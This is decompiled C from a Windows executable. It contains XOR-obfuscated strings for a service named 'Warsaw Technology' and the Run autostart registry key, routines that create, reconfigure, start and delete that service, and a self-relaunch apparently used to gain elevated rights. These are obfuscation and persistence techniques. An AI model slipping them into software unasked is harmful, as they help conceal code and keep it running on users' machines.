//----- (000000014000A190) ----------------------------------------------------
char *sub_14000A190()
{
  int v0; // er9
  int v1; // er10
  char v2; // r10
  char *result; // rax
  unsigned int v4; // ecx
  __int64 v5; // r9
  char v6; // r8
  char v7; // dl

  v0 = dword_1400D9A74;
  if ( dword_1400D9A74 & 1 )
  {
    v2 = byte_1400D9A73;
  }
  else
  {
    v1 = 69069 * dword_1400D9A38 + 1234567;
    v0 = dword_1400D9A74 | 1;
    dword_1400D9A38 = v1;
    dword_1400D9A74 |= 1u;
    dword_1400D9A2C = HIWORD(dword_1400D9A2C) + 36969 * (unsigned __int16)dword_1400D9A2C;
    LOBYTE(v1) = (BYTE2(dword_1400D9A3C) + 80 * dword_1400D9A3C) ^ v1;
    dword_1400D9A3C = HIWORD(dword_1400D9A3C) + 18000 * (unsigned __int16)dword_1400D9A3C;
    v2 = (((unsigned int)dword_1400D9A30 >> 13) ^ 32 * dword_1400D9A30 ^ dword_1400D9A30) + v1;
    dword_1400D9A30 ^= ((unsigned int)dword_1400D9A30 >> 13) ^ 32 * (dword_1400D9A30 ^ (dword_1400D9A30 << 12));
    byte_1400D9A73 = v2;
  }
  if ( !(v0 & 2) )
  {
    dword_1400D9A74 = v0 | 2;
    byte_1400D9A78[0] = v2 ^ 0x57;
    byte_1400D9A79 = (v2 - 1) ^ 0x61;
    byte_1400D9A7A = (v2 - 2) ^ 0x72;
    byte_1400D9A7B = (v2 - 3) ^ 0x73;
    byte_1400D9A7C = (v2 - 4) ^ 0x61;
    byte_1400D9A7D = (v2 - 5) ^ 0x77;
    byte_1400D9A7E = (v2 - 6) ^ 0x20;
    byte_1400D9A7F = (v2 - 7) ^ 0x54;
    byte_1400D9A80 = (v2 - 8) ^ 0x65;
    byte_1400D9A81 = (v2 - 9) ^ 0x63;
    byte_1400D9A82 = (v2 - 10) ^ 0x68;
    byte_1400D9A83 = (v2 - 11) ^ 0x6E;
    byte_1400D9A84 = (v2 - 12) ^ 0x6F;
    byte_1400D9A85 = (v2 - 13) ^ 0x6C;
    byte_1400D9A86 = (v2 - 14) ^ 0x6F;
    byte_1400D9A87 = (v2 - 15) ^ 0x67;
    byte_1400D9A88 = (v2 - 16) ^ 0x79;
  }
  result = byte_1400D9A90;
  if ( !byte_1400D9A90[0] )
  {
    v4 = 0;
    v5 = 0i64;
    do
    {
      v6 = byte_1400D9A78[v5++];
      v7 = v2 - v4++;
      byte_1400D9A90[v5 - 1] = v7 ^ v6;
    }
    while ( v4 < 0x11 );
  }
  return result;
}
// 1400D9A2C: using guessed type int dword_1400D9A2C;
// 1400D9A30: using guessed type int dword_1400D9A30;
// 1400D9A38: using guessed type int dword_1400D9A38;
// 1400D9A3C: using guessed type int dword_1400D9A3C;
// 1400D9A73: using guessed type char byte_1400D9A73;
// 1400D9A74: using guessed type int dword_1400D9A74;
// 1400D9A79: using guessed type char byte_1400D9A79;
// 1400D9A7A: using guessed type char byte_1400D9A7A;
// 1400D9A7B: using guessed type char byte_1400D9A7B;
// 1400D9A7C: using guessed type char byte_1400D9A7C;
// 1400D9A7D: using guessed type char byte_1400D9A7D;
// 1400D9A7E: using guessed type char byte_1400D9A7E;
// 1400D9A7F: using guessed type char byte_1400D9A7F;
// 1400D9A80: using guessed type char byte_1400D9A80;
// 1400D9A81: using guessed type char byte_1400D9A81;
// 1400D9A82: using guessed type char byte_1400D9A82;
// 1400D9A83: using guessed type char byte_1400D9A83;
// 1400D9A84: using guessed type char byte_1400D9A84;
// 1400D9A85: using guessed type char byte_1400D9A85;
// 1400D9A86: using guessed type char byte_1400D9A86;
// 1400D9A87: using guessed type char byte_1400D9A87;
// 1400D9A88: using guessed type char byte_1400D9A88;

//----- (000000014000A360) ----------------------------------------------------
__int64 sub_14000A360()
{
  bool v0; // r14
  char *v1; // rax
  __int64 v2; // rdx
  __int64 v3; // rcx
  char *v4; // rbx
  __int64 v5; // rsi
  unsigned __int64 v6; // rax
  char *v7; // rdi
  __int64 v8; // rax
  _QWORD *v9; // rax
  _QWORD *v10; // rax
  _QWORD *v11; // rax
  SC_HANDLE v12; // rbx
  const CHAR *lpBinaryPathName; // rdi
  char *v14; // rsi
  char *v15; // rax
  SC_HANDLE v16; // rax
  char *v17; // rax
  SC_HANDLE v18; // rdi
  const CHAR *v19; // rsi
  char *v20; // rax
  unsigned __int8 v21; // bl
  LPCSTR Src; // [rsp+70h] [rbp-78h]
  __int64 v24; // [rsp+78h] [rbp-70h]
  __int64 v25; // [rsp+80h] [rbp-68h]
  unsigned __int64 v26; // [rsp+88h] [rbp-60h]
  void *v27; // [rsp+90h] [rbp-58h]
  __int64 v28; // [rsp+A0h] [rbp-48h]
  unsigned __int64 v29; // [rsp+A8h] [rbp-40h]
  void *v30; // [rsp+B0h] [rbp-38h]
  __int64 v31; // [rsp+C0h] [rbp-28h]
  unsigned __int64 v32; // [rsp+C8h] [rbp-20h]
  void *v33; // [rsp+D0h] [rbp-18h]
  __int64 v34; // [rsp+E0h] [rbp-8h]
  unsigned __int64 v35; // [rsp+E8h] [rbp+0h]
  void *v36; // [rsp+F0h] [rbp+8h]
  unsigned __int64 v37; // [rsp+108h] [rbp+20h]

  v24 = -2i64;
  v0 = 0;
  v26 = 15i64;
  v25 = 0i64;
  LOBYTE(Src) = 0;
  sub_140004F20(&v26, "\"", 1ui64);
  v1 = (char *)sub_140009950(&v36);
  v4 = v1;
  v29 = 7i64;
  v28 = 0i64;
  LOWORD(v27) = 0;
  v5 = *((_QWORD *)v1 + 2);
  if ( v5 )
  {
    v6 = *((_QWORD *)v1 + 3);
    if ( v6 < 0x10 )
      v7 = v4;
    else
      v7 = *(char **)v4;
    if ( v6 >= 0x10 )
      v4 = *(char **)v4;
    v8 = sub_140031970(v3, v2);
    sub_140030C60(v4, &v7[v5], &v27, v8);
  }
  v9 = sub_14007A1A0();
  v10 = sub_140003DE0(&v33, v9, &v27);
  v11 = sub_1400054F0(v10, &v30);
  sub_140004B80(&Src, v11, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v32 >= 0x10 )
    operator delete(v30);
  v32 = 15i64;
  v31 = 0i64;
  LOBYTE(v30) = 0;
  if ( v35 >= 8 )
    operator delete(v33);
  v35 = 7i64;
  v34 = 0i64;
  LOWORD(v33) = 0;
  if ( v29 >= 8 )
    operator delete(v27);
  v29 = 7i64;
  v28 = 0i64;
  LOWORD(v27) = 0;
  if ( v37 >= 0x10 )
    operator delete(v36);
  sub_140004CA0(&Src, "\"", 1ui64);
  if ( !(unsigned __int8)sub_14000A780() )
  {
    v12 = OpenSCManagerW(0i64, 0i64, 2u);
    Src = (LPCSTR)v12;
    if ( !v12 )
      goto LABEL_39;
    lpBinaryPathName = (const CHAR *)&Src;
    if ( v26 >= 0x10 )
      lpBinaryPathName = Src;
    v14 = sub_14000A190();
    v15 = sub_14000A190();
    v16 = CreateServiceA(v12, v15, v14, 0xF01FFu, 0x10u, 2u, 1u, lpBinaryPathName, 0i64, 0i64, 0i64, 0i64, 0i64);
    v0 = v16 != 0i64;
    if ( v16 )
      CloseServiceHandle(v16);
    goto LABEL_32;
  }
  v12 = OpenSCManagerW(0i64, 0i64, 0xF003Fu);
  Src = (LPCSTR)v12;
  if ( v12 )
  {
    v17 = sub_14000A190();
    v18 = OpenServiceA(v12, v17, 2u);
    if ( v18 )
    {
      v19 = (const CHAR *)&Src;
      if ( v26 >= 0x10 )
        v19 = Src;
      v20 = sub_14000A190();
      v0 = 0;
      if ( ChangeServiceConfigA(v18, 0x10u, 2u, 1u, v19, 0i64, 0i64, 0i64, 0i64, 0i64, v20) )
        v0 = 1;
    }
    if ( v18 )
      CloseServiceHandle(v18);
  }
  if ( v12 )
LABEL_32:
    CloseServiceHandle(v12);
  if ( v0 )
  {
    sub_1400094A0();
    sub_14000AEF0(0);
    v21 = 1;
    goto LABEL_40;
  }
  if ( GetLastError() == 5 && !(unsigned __int8)sub_14000A830() && sub_14000A6C0() )
  {
    v21 = sub_14000B190();
    goto LABEL_40;
  }
LABEL_39:
  v21 = 0;
LABEL_40:
  if ( v26 >= 0x10 )
    operator delete((void *)Src);
  return v21;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);

//----- (000000014000A6C0) ----------------------------------------------------
bool sub_14000A6C0()
{
  SHELLEXECUTEINFOA pExecInfo; // [rsp+20h] [rbp-198h]
  char Dst; // [rsp+90h] [rbp-128h]

  memset(&Dst, 0, 0x104ui64);
  GetModuleFileNameA(0i64, &Dst, 0x104u);
  memset(&pExecInfo.fMask, 0, 0x6Cui64);
  pExecInfo.cbSize = 112;
  pExecInfo.lpVerb = sub_140009E90();
  pExecInfo.nShow = 1;
  pExecInfo.lpFile = &Dst;
  pExecInfo.lpParameters = sub_140009CC0();
  pExecInfo.fMask = 256;
  return ShellExecuteExA(&pExecInfo) == 1;
}

//----- (000000014000A780) ----------------------------------------------------
_BOOL8 sub_14000A780()
{
  SC_HANDLE v0; // rbx
  bool v1; // si
  char *v2; // rax
  SC_HANDLE v3; // rdi

  v0 = OpenSCManagerW(0i64, 0i64, 1u);
  if ( v0 )
  {
    v2 = sub_14000A190();
    v3 = OpenServiceA(v0, v2, 4u);
    v1 = v3 && GetLastError() != 1060;
    if ( v3 )
      CloseServiceHandle(v3);
  }
  else
  {
    v1 = 0;
  }
  if ( v0 )
    CloseServiceHandle(v0);
  return v1;
}

//----- (000000014000A830) ----------------------------------------------------
_BOOL8 sub_14000A830()
{
  SC_HANDLE v0; // rbx
  bool v1; // si
  char *v2; // rax
  SC_HANDLE v3; // rax
  SC_HANDLE v4; // rdi
  struct _SERVICE_STATUS ServiceStatus; // [rsp+38h] [rbp-30h]

  v0 = OpenSCManagerW(0i64, 0i64, 1u);
  if ( v0 )
  {
    v2 = sub_14000A190();
    v3 = OpenServiceA(v0, v2, 4u);
    v4 = v3;
    if ( v3 && QueryServiceStatus(v3, &ServiceStatus) )
      v1 = ServiceStatus.dwCurrentState == 4;
    else
      v1 = 0;
    if ( v4 )
      CloseServiceHandle(v4);
  }
  else
  {
    v1 = 0;
  }
  if ( v0 )
    CloseServiceHandle(v0);
  return v1;
}

//----- (000000014000A900) ----------------------------------------------------
void sub_14000A900()
{
  byte_1400D99D8 = 1;
}
// 1400D99D8: using guessed type char byte_1400D99D8;

//----- (000000014000AA50) ----------------------------------------------------
__int64 __fastcall sub_14000AA50(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  _QWORD *v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  _QWORD *v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  char v15; // [rsp+28h] [rbp-31h]
  char v16; // [rsp+40h] [rbp-19h]
  __int64 v17; // [rsp+58h] [rbp-1h]
  __int64 v18; // [rsp+60h] [rbp+7h]
  void *Src; // [rsp+68h] [rbp+Fh]
  void *v20; // [rsp+70h] [rbp+17h]
  __int64 v21; // [rsp+78h] [rbp+1Fh]
  unsigned __int64 v22; // [rsp+80h] [rbp+27h]
  unsigned __int64 v23; // [rsp+88h] [rbp+2Fh]

  v18 = -2i64;
  v2 = a2;
  v3 = a1;
  v17 = a2;
  sub_14006BD10((__int64)&v16, 0);
  sub_14006BCD0((__int64)&v15, *(_DWORD *)v3);
  v4 = sub_140009740(&Src);
  v5 = sub_14006C0C0((__int64)&v16, v4);
  v6 = sub_14006C4B0(v5, &unk_1400A2F80);
  sub_14006BFB0(v6);
  if ( v22 >= 0x10 )
    operator delete(Src);
  v22 = 15i64;
  v21 = 0i64;
  LOBYTE(Src) = 0;
  sub_14006BF10((__int64)&v15);
  sub_14006BDF0((__int64)&v15, *(_QWORD *)(v3 + 8));
  v7 = sub_140009740(&Src);
  v8 = sub_14006C0C0((__int64)&v16, v7);
  v9 = sub_14006C4B0(v8, &unk_1400A2F84);
  sub_14006BFB0(v9);
  if ( v22 >= 0x10 )
    operator delete(Src);
  v22 = 15i64;
  v21 = 0i64;
  LOBYTE(Src) = 0;
  sub_14006BF10((__int64)&v15);
  sub_14006BCD0((__int64)&v15, *(_DWORD *)(v3 + 16));
  v10 = sub_140009740(&Src);
  v11 = sub_14006C0C0((__int64)&v16, v10);
  v12 = sub_14006C4B0(v11, &unk_1400A2F88);
  sub_14006BFB0(v12);
  if ( v22 >= 0x10 )
    operator delete(Src);
  v22 = 15i64;
  v21 = 0i64;
  LOBYTE(Src) = 0;
  sub_14006BF10((__int64)&v15);
  v13 = sub_140072820((__int64)&Src);
  (*(void (__fastcall **)(__int64, __int64, char *))(*(_QWORD *)v13 + 8i64))(v13, v2, &v16);
  Src = &off_1400A2B70;
  if ( v23 >= 0x10 )
    operator delete(v20);
  v23 = 15i64;
  v22 = 0i64;
  LOBYTE(v20) = 0;
  sub_14007E240(&Src);
  sub_14006BF10((__int64)&v16);
  return v2;
}
// 1400A2B70: using guessed type __int64 (__fastcall *off_1400A2B70)(void *);

//----- (000000014000AC60) ----------------------------------------------------
__int64 __fastcall HandlerProc(__int64 dwControl, __int64 dwEventType, LPVOID lpEventData, LPVOID lpContext)
{
  __int64 result; // rax
  int v5; // [rsp+30h] [rbp+8h]

  if ( (_DWORD)dwControl == 5 )
  {
    if ( qword_1400D9A18 )
      sub_1400078E0((__int64)qword_1400D9A18);
    v5 = 0;
    sub_14001B530((__int64)&unk_1400D99E0, (unsigned int *)&v5);
    result = 0i64;
  }
  else
  {
    if ( (_DWORD)dwControl == 13 )
    {
      if ( (_DWORD)dwEventType == 18 && (unsigned __int8)sub_140015F60(dwControl, dwEventType, lpEventData, lpContext) )
      {
        sub_14000A910();
        return 0i64;
      }
    }
    else if ( (_DWORD)dwControl == 14 && *(_DWORD *)lpEventData == 8 )
    {
      if ( !(((_DWORD)dwEventType - 1) & 0xFFFFFFF9) && (_DWORD)dwEventType != 7 )
      {
        sub_14001B240((__int64)&unk_1400D99E0, (_DWORD *)lpEventData + 1);
        return 0i64;
      }
      if ( !(((_DWORD)dwEventType - 2) & 0xFFFFFFF9) && (_DWORD)dwEventType != 8 )
        sub_14001B530((__int64)&unk_1400D99E0, (unsigned int *)lpEventData + 1);
    }
    result = 0i64;
  }
  return result;
}
// 14000A910: using guessed type __int64 sub_14000A910(void);
// 140015F60: using guessed type __int64 __fastcall sub_140015F60(_QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000014000AD10) ----------------------------------------------------
int sub_14000AD10()
{
  char *v0; // rax
  SERVICE_STATUS_HANDLE v1; // rax
  SERVICE_STATUS_HANDLE v2; // rsi
  __int64 v3; // rcx
  _QWORD *v4; // rax
  __int64 *v5; // rax
  Concurrency::details::ContextBase *v6; // rdx
  __int64 v7; // rcx
  volatile signed __int32 *v8; // rbx
  volatile signed __int32 *v9; // rbx
  int v11; // [rsp+20h] [rbp-88h]
  int v12; // [rsp+24h] [rbp-84h]
  char v13; // [rsp+28h] [rbp-80h]
  volatile signed __int32 *v14; // [rsp+30h] [rbp-78h]
  __int64 v15; // [rsp+38h] [rbp-70h]
  Concurrency::details::ContextBase *v16; // [rsp+40h] [rbp-68h]
  struct _SERVICE_STATUS ServiceStatus; // [rsp+50h] [rbp-58h]
  void *Src; // [rsp+70h] [rbp-38h]
  unsigned __int64 v19; // [rsp+88h] [rbp-20h]

  v15 = -2i64;
  v0 = sub_14000A190();
  v1 = RegisterServiceCtrlHandlerExA(v0, (LPHANDLER_FUNCTION_EX)HandlerProc, 0i64);
  v2 = v1;
  if ( v1 )
  {
    sub_1400094A0();
    LOBYTE(v3) = 1;
    sub_1400157C0(v3);
    sub_14000AEF0(1);
    *(_QWORD *)&ServiceStatus.dwControlsAccepted = 0i64;
    *(_QWORD *)&ServiceStatus.dwServiceSpecificExitCode = 0i64;
    ServiceStatus.dwCurrentState = 4;
    ServiceStatus.dwWaitHint = 5000;
    ServiceStatus.dwServiceType = 16;
    ServiceStatus.dwControlsAccepted = 196;
    SetServiceStatus(v2, &ServiceStatus);
    v4 = sub_140009FC0(&Src);
    v5 = sub_140008900((__int64)&v13, v4);
    v16 = (Concurrency::details::ContextBase *)*v5;
    v6 = v16;
    v7 = v5[1];
    v5[1] = 0i64;
    *v5 = 0i64;
    qword_1400D9A18 = v6;
    v8 = (volatile signed __int32 *)qword_1400D9A20;
    qword_1400D9A20 = v7;
    if ( v8 )
    {
      if ( !_InterlockedDecrement(v8 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v8 + 8i64))(v8);
        if ( !_InterlockedDecrement(v8 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v8 + 16i64))(v8);
      }
    }
    v9 = v14;
    if ( v14 )
    {
      if ( !_InterlockedDecrement(v14 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v9 + 8i64))(v9);
        if ( !_InterlockedDecrement(v9 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v9 + 16i64))(v9);
      }
    }
    if ( v19 >= 0x10 )
      operator delete(Src);
    if ( qword_1400D9A18 && sub_140007800((__int64)qword_1400D9A18) )
    {
      v11 = 0;
      sub_14001B240((__int64)&unk_1400D99E0, &v11);
      sub_140007BA0((__int64)qword_1400D9A18);
      v12 = 0;
      sub_14001B530((__int64)&unk_1400D99E0, (unsigned int *)&v12);
    }
    ServiceStatus.dwCurrentState = 1;
    LODWORD(v1) = SetServiceStatus(v2, &ServiceStatus);
  }
  return (signed int)v1;
}
// 1400157C0: using guessed type __int64 __fastcall sub_1400157C0(_QWORD);
// 1400D9A20: using guessed type __int64 qword_1400D9A20;

//----- (000000014000AEF0) ----------------------------------------------------
void __fastcall sub_14000AEF0(char a1)
{
  char v1; // bl
  char *v2; // rax
  void *v3[2]; // [rsp+30h] [rbp-F8h]
  __int64 v4; // [rsp+40h] [rbp-E8h]
  size_t PtNumOfCharConverted; // [rsp+48h] [rbp-E0h]
  __int64 v6; // [rsp+50h] [rbp-D8h]
  __int64 (__fastcall **v7)(); // [rsp+60h] [rbp-C8h]
  __int64 DstBuf; // [rsp+D0h] [rbp-58h]
  __int64 v9; // [rsp+D8h] [rbp-50h]
  __int64 v10; // [rsp+E0h] [rbp-48h]
  __int64 v11; // [rsp+E8h] [rbp-40h]
  __int64 v12; // [rsp+F0h] [rbp-38h]
  __int64 v13; // [rsp+F8h] [rbp-30h]
  __int64 v14; // [rsp+100h] [rbp-28h]
  __int64 v15; // [rsp+108h] [rbp-20h]

  v6 = -2i64;
  v1 = a1;
  DstBuf = 0i64;
  v9 = 0i64;
  v10 = 0i64;
  v11 = 0i64;
  v12 = 0i64;
  v13 = 0i64;
  v14 = 0i64;
  v15 = 0i64;
  PtNumOfCharConverted = 0i64;
  v2 = sub_14000A190();
  mbstowcs_s(&PtNumOfCharConverted, (wchar_t *)&DstBuf, 0x20ui64, v2, 0x20ui64);
  _mm_storeu_si128((__m128i *)v3, (__m128i)0i64);
  v4 = 0i64;
  sub_1400141D0(&v7, (const wchar_t *)&DstBuf);
  if ( v1 )
    sub_140014720((__int64 *)v3);
  else
    sub_140014600((__int64 *)v3);
  sub_140014220((__int64)&v7, (__int64 *)v3);
  if ( sub_140015200() )
    sub_140015290(v1);
  v7 = &off_1400B0E50;
  if ( v3[0] )
    operator delete(v3[0]);
}
// 1400B0E50: using guessed type __int64 (__fastcall *off_1400B0E50)();

//----- (000000014000B000) ----------------------------------------------------
__int64 sub_14000B000()
{
  return (unsigned __int8)byte_1400D99D8;
}
// 1400D99D8: using guessed type char byte_1400D99D8;

//----- (000000014000B010) ----------------------------------------------------
char sub_14000B010()
{
  SC_HANDLE v1; // rbx
  bool v2; // si
  char *v3; // rax
  SC_HANDLE v4; // rax
  SC_HANDLE v5; // rdi

  if ( (unsigned __int8)sub_14000A830() )
    return 1;
  v1 = OpenSCManagerW(0i64, 0i64, 1u);
  if ( v1 )
  {
    v3 = sub_14000A190();
    v4 = OpenServiceA(v1, v3, 0x10u);
    v5 = v4;
    if ( v4 )
      v2 = StartServiceW(v4, 0, 0i64) == 1;
    else
      v2 = 0;
    if ( v5 )
      CloseServiceHandle(v5);
  }
  else
  {
    v2 = 0;
  }
  if ( v1 )
    CloseServiceHandle(v1);
  return v2;
}

//----- (000000014000B0D0) ----------------------------------------------------
_BOOL8 sub_14000B0D0()
{
  SC_HANDLE v0; // rdi
  bool v1; // si
  char *v2; // rax
  SC_HANDLE v3; // rax
  SC_HANDLE v4; // rbx

  sub_14000AEF0(0);
  sub_1400157C0(0i64);
  sub_1400095F0();
  v0 = OpenSCManagerW(0i64, 0i64, 0xF003Fu);
  if ( v0 )
  {
    v2 = sub_14000A190();
    v3 = OpenServiceA(v0, v2, 0x10000u);
    v4 = v3;
    if ( v3 )
      v1 = DeleteService(v3) == 1;
    else
      v1 = 0;
    if ( v4 )
      CloseServiceHandle(v4);
  }
  else
  {
    v1 = 0;
  }
  if ( v0 )
    CloseServiceHandle(v0);
  return v1;
}
// 1400157C0: using guessed type __int64 __fastcall sub_1400157C0(_QWORD);

//----- (000000014000B190) ----------------------------------------------------
__int64 sub_14000B190()
{
  SC_HANDLE v0; // rdi
  unsigned __int8 v1; // si
  char *v2; // rax
  SC_HANDLE v3; // rbx
  clock_t v4; // esi
  struct _SERVICE_STATUS ServiceStatus; // [rsp+38h] [rbp-50h]

  v0 = OpenSCManagerW(0i64, 0i64, 1u);
  if ( v0 )
  {
    v2 = sub_14000A190();
    v3 = OpenServiceA(v0, v2, 4u);
    if ( v3 )
    {
      *(_QWORD *)&ServiceStatus.dwServiceType = 0i64;
      *(_QWORD *)&ServiceStatus.dwControlsAccepted = 0i64;
      *(_QWORD *)&ServiceStatus.dwServiceSpecificExitCode = 0i64;
      ServiceStatus.dwWaitHint = 0;
      v4 = clock();
      while ( QueryServiceStatus(v3, &ServiceStatus) == 1 )
      {
        if ( ServiceStatus.dwCurrentState == 4 )
          break;
        if ( (double)(clock() - v4) / 1000.0 > 10.0 )
          goto LABEL_9;
        Sleep(0xFAu);
      }
      v1 = 1;
    }
    else
    {
LABEL_9:
      v1 = 0;
    }
    if ( v3 )
      CloseServiceHandle(v3);
  }
  else
  {
    v1 = 0;
  }
  if ( v0 )
    CloseServiceHandle(v0);
  return v1;
}

//----- (000000014000B2F0) ----------------------------------------------------
_QWORD *__fastcall sub_14000B2F0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9B20;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9B20 & 1 )
  {
    v5 = byte_1400D9B1C;
  }
  else
  {
    v4 = 69069 * dword_1400D9B14 + 1234567;
    v1 = dword_1400D9B20 | 1;
    dword_1400D9B14 = v4;
    dword_1400D9B20 |= 1u;
    dword_1400D9B0C = HIWORD(dword_1400D9B0C) + 36969 * (unsigned __int16)dword_1400D9B0C;
    LOBYTE(v4) = (BYTE2(dword_1400D9B18) + 80 * dword_1400D9B18) ^ v4;
    dword_1400D9B18 = HIWORD(dword_1400D9B18) + 18000 * (unsigned __int16)dword_1400D9B18;
    v5 = (((unsigned int)dword_1400D9B10 >> 13) ^ 32 * dword_1400D9B10 ^ dword_1400D9B10) + v4;
    dword_1400D9B10 ^= ((unsigned int)dword_1400D9B10 >> 13) ^ 32 * (dword_1400D9B10 ^ (dword_1400D9B10 << 12));
    byte_1400D9B1C = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9B20 = v1 | 2;
    byte_1400D9B28[0] = v5 ^ 0x53;
    byte_1400D9B29 = (v5 - 1) ^ 0x6F;
    byte_1400D9B2A = (v5 - 2) ^ 0x66;
    byte_1400D9B2B = (v5 - 3) ^ 0x74;
    byte_1400D9B2C = (v5 - 4) ^ 0x77;
    byte_1400D9B2D = (v5 - 5) ^ 0x61;
    byte_1400D9B2E = (v5 - 6) ^ 0x72;
    byte_1400D9B2F = (v5 - 7) ^ 0x65;
    byte_1400D9B30 = (v5 - 8) ^ 0x5C;
    byte_1400D9B31 = (v5 - 9) ^ 0x4D;
    byte_1400D9B32 = (v5 - 10) ^ 0x69;
    byte_1400D9B33 = (v5 - 11) ^ 0x63;
    byte_1400D9B34 = (v5 - 12) ^ 0x72;
    byte_1400D9B35 = (v5 - 13) ^ 0x6F;
    byte_1400D9B36 = (v5 - 14) ^ 0x73;
    byte_1400D9B37 = (v5 - 15) ^ 0x6F;
    byte_1400D9B38 = (v5 - 16) ^ 0x66;
    byte_1400D9B39 = (v5 - 17) ^ 0x74;
    byte_1400D9B3A = (v5 - 18) ^ 0x5C;
    byte_1400D9B3B = (v5 - 19) ^ 0x57;
    byte_1400D9B3C = (v5 - 20) ^ 0x69;
    byte_1400D9B3D = (v5 - 21) ^ 0x6E;
    byte_1400D9B3E = (v5 - 22) ^ 0x64;
    byte_1400D9B3F = (v5 - 23) ^ 0x6F;
    byte_1400D9B40 = (v5 - 24) ^ 0x77;
    byte_1400D9B41 = (v5 - 25) ^ 0x73;
    byte_1400D9B42 = (v5 - 26) ^ 0x5C;
    byte_1400D9B43 = (v5 - 27) ^ 0x43;
    byte_1400D9B44 = (v5 - 28) ^ 0x75;
    byte_1400D9B45 = (v5 - 29) ^ 0x72;
    byte_1400D9B46 = (v5 - 30) ^ 0x72;
    byte_1400D9B47 = (v5 - 31) ^ 0x65;
    byte_1400D9B48 = (v5 - 32) ^ 0x6E;
    byte_1400D9B49 = (v5 - 33) ^ 0x74;
    byte_1400D9B4A = (v5 - 34) ^ 0x56;
    byte_1400D9B4B = (v5 - 35) ^ 0x65;
    byte_1400D9B4C = (v5 - 36) ^ 0x72;
    byte_1400D9B4D = (v5 - 37) ^ 0x73;
    byte_1400D9B4E = (v5 - 38) ^ 0x69;
    byte_1400D9B4F = (v5 - 39) ^ 0x6F;
    byte_1400D9B50 = (v5 - 40) ^ 0x6E;
    byte_1400D9B51 = (v5 - 41) ^ 0x5C;
    byte_1400D9B52 = (v5 - 42) ^ 0x52;
    byte_1400D9B53 = (v5 - 43) ^ 0x75;
    byte_1400D9B54 = (v5 - 44) ^ 0x6E;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x2Dui64 )
  {
    sub_140004790(Src, 0x2Dui64, 0i64);
    v5 = byte_1400D9B1C;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v6[4] = 0i64;
  *((_DWORD *)v6 + 10) = 0;
  *((_BYTE *)v6 + 44) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 45i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 45) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9B28[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x2D );
  return v3;
}
// 1400D9B0C: using guessed type int dword_1400D9B0C;
// 1400D9B10: using guessed type int dword_1400D9B10;
// 1400D9B14: using guessed type int dword_1400D9B14;
// 1400D9B18: using guessed type int dword_1400D9B18;
// 1400D9B1C: using guessed type char byte_1400D9B1C;
// 1400D9B20: using guessed type int dword_1400D9B20;
// 1400D9B29: using guessed type char byte_1400D9B29;
// 1400D9B2A: using guessed type char byte_1400D9B2A;
// 1400D9B2B: using guessed type char byte_1400D9B2B;
// 1400D9B2C: using guessed type char byte_1400D9B2C;
// 1400D9B2D: using guessed type char byte_1400D9B2D;
// 1400D9B2E: using guessed type char byte_1400D9B2E;
// 1400D9B2F: using guessed type char byte_1400D9B2F;
// 1400D9B30: using guessed type char byte_1400D9B30;
// 1400D9B31: using guessed type char byte_1400D9B31;
// 1400D9B32: using guessed type char byte_1400D9B32;
// 1400D9B33: using guessed type char byte_1400D9B33;
// 1400D9B34: using guessed type char byte_1400D9B34;
// 1400D9B35: using guessed type char byte_1400D9B35;
// 1400D9B36: using guessed type char byte_1400D9B36;
// 1400D9B37: using guessed type char byte_1400D9B37;
// 1400D9B38: using guessed type char byte_1400D9B38;
// 1400D9B39: using guessed type char byte_1400D9B39;
// 1400D9B3A: using guessed type char byte_1400D9B3A;
// 1400D9B3B: using guessed type char byte_1400D9B3B;
// 1400D9B3C: using guessed type char byte_1400D9B3C;
// 1400D9B3D: using guessed type char byte_1400D9B3D;
// 1400D9B3E: using guessed type char byte_1400D9B3E;
// 1400D9B3F: using guessed type char byte_1400D9B3F;
// 1400D9B40: using guessed type char byte_1400D9B40;
// 1400D9B41: using guessed type char byte_1400D9B41;
// 1400D9B42: using guessed type char byte_1400D9B42;
// 1400D9B43: using guessed type char byte_1400D9B43;
// 1400D9B44: using guessed type char byte_1400D9B44;
// 1400D9B45: using guessed type char byte_1400D9B45;
// 1400D9B46: using guessed type char byte_1400D9B46;
// 1400D9B47: using guessed type char byte_1400D9B47;
// 1400D9B48: using guessed type char byte_1400D9B48;
// 1400D9B49: using guessed type char byte_1400D9B49;
// 1400D9B4A: using guessed type char byte_1400D9B4A;
// 1400D9B4B: using guessed type char byte_1400D9B4B;
// 1400D9B4C: using guessed type char byte_1400D9B4C;
// 1400D9B4D: using guessed type char byte_1400D9B4D;
